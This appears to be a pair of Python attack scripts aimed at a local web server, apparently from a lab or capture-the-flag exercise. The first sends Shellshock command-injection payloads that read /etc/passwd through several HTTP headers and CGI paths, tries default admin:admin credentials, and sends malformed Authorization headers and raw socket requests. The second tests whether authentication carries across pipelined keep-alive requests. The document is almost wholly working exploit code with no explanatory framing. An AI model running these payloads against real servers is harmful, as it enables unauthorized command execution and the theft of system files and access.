#!/usr/bin/env python3
import requests
import base64
import socket
import time

target = "http://localhost:80"

# Test 1: Basic requests
print("[*] Testing basic access...")
r = requests.get(target)
print(f"No auth: {r.status_code}")

r = requests.get(target, auth=("admin", "admin"))
print(f"With admin:admin auth: {r.status_code}")

# Test 2: Shellshock in various headers
print("\n[*] Testing Shellshock...")
shellshock_payloads = [
    ("User-Agent", "() { :; }; echo; /bin/cat /etc/passwd"),
    ("Cookie", "() { :; }; echo; /bin/cat /etc/passwd"),
    ("Referer", "() { :; }; echo; /bin/cat /etc/passwd"),
    ("Accept", "() { :; }; echo; /bin/cat /etc/passwd"),
]

for header, payload in shellshock_payloads:
    try:
        r = requests.get(target, headers={header: payload}, auth=("admin", "admin"), timeout=5)
        if "root:" in r.text or r.status_code == 200:
            print(f"Possible Shellshock in {header}!")
            print(r.text[:500])
    except Exception as e:
        print(f"Error testing {header}: {e}")

# Test 3: Try different paths with Shellshock
print("\n[*] Testing Shellshock on /cgi-bin/ paths...")
cgi_paths = ["/cgi-bin/", "/cgi-bin/test", "/cgi-bin/printenv", "/cgi-bin/index.cgi", "/cgi-bin/index.pl", "/cgi-bin/index.sh"]
for path in cgi_paths:
    try:
        r = requests.get(f"{target}{path}",
                        headers={"User-Agent": "() { :; }; echo; /bin/cat /etc/passwd"},
                        auth=("admin", "admin"),
                        timeout=5)
        print(f"{path}: {r.status_code}")
        if "root:" in r.text:
            print(f"  -> FOUND! Shellshock works on {path}")
            print(r.text[:500])
    except Exception as e:
        print(f"{path}: Error - {e}")

# Test 4: Try raw socket for CRLF injection
print("\n[*] Testing raw socket requests...")
def raw_request(req):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("localhost", 80))
    s.sendall(req.encode())
    response = b""
    while True:
        data = s.recv(4096)
        if not data:
            break
        response += data
    s.close()
    return response.decode('utf-8', errors='ignore')

# Simple request
req = "GET / HTTP/1.1\r\nHost: localhost\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nConnection: close\r\n\r\n"
print("Raw request result:")
result = raw_request(req)
print(result[:500])

# Test 5: Different auth schemes
print("\n[*] Testing auth variations...")
# Try Digest auth header
r = requests.get(target, headers={"Authorization": "Digest username=admin"})
print(f"Digest auth: {r.status_code}")

# Try empty auth
r = requests.get(target, headers={"Authorization": "Basic"})
print(f"Empty Basic: {r.status_code}")

# Try only spaces
r = requests.get(target, headers={"Authorization": "Basic    "})
print(f"Basic with spaces: {r.status_code}")

print("\n[*] Testing complete!")

#!/usr/bin/env python3
import socket
import ssl

def multi_request():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("localhost", 80))
    
    # Send first request without auth
    req1 = "GET / HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\n"
    s.sendall(req1.encode())
    
    response1 = b""
    while b"\r\n\r\n" not in response1:
        response1 += s.recv(1024)
    
    # Parse content length and read body
    for line in response1.decode().split('\r\n'):
        if line.lower().startswith('content-length'):
            content_len = int(line.split(':')[1].strip())
            break
    
    # Read remaining body
    body_start = response1.find(b"\r\n\r\n") + 4
    body = response1[body_start:]
    while len(body) < content_len:
        body += s.recv(1024)
    
    print("First response (no auth):", response1[:100])
    
    # Send second request with auth
    req2 = "GET / HTTP/1.1\r\nHost: localhost\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nConnection: close\r\n\r\n"
    s.sendall(req2.encode())
    
    response2 = b""
    while True:
        data = s.recv(1024)
        if not data:
            break
        response2 += data
    
    print("Second response (with auth):", response2[:100])
    s.close()
